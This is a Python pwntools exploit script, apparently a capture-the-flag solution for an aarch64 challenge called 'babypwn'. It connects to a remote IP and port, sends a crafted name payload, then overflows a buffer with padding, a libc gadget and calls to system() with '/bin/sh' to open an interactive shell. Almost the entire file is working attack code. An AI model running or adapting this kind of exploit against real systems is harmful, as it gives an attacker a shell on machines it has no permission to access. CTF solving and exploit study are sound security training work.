# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './babypwn'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
# libc = elf.libc
libc = ELF('./libc.so.6')
DEBUG = 0
if DEBUG:
    # libc = elf.libc
    # p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/','-g','1234',binary])
    p = process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/',binary])
else:
    host = '1.13.171.197'
    port = '20000'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data


def cmd(num):
    sla(':',num)

def attack():
    
    libc.address = 0x55009ed6b8 - libc.sym['stderr']

    sla("born" , "15")
    payload = "K33nLab\x00".ljust(0x18 , "\x00") + p32(2016) + p32(1000)
    sa('name' , payload)

    lg('libc.address' , libc.address)
    gadget = libc.address + 0x0000000000069500
    binsh_addr = libc.search("/bin/sh\x00").next()
    system_addr = libc.sym['system']

    payload  = "a"*0x54 + p64(0) + p64(gadget)
    payload += p64(system_addr)*3 + p64(binsh_addr)

    sa('message:' , payload)


    p.interactive()

attack()

'''
@File    :   babypwn.py
@Time    :   2022/10/15 15:25:03
@Author  :   Niyah 
'''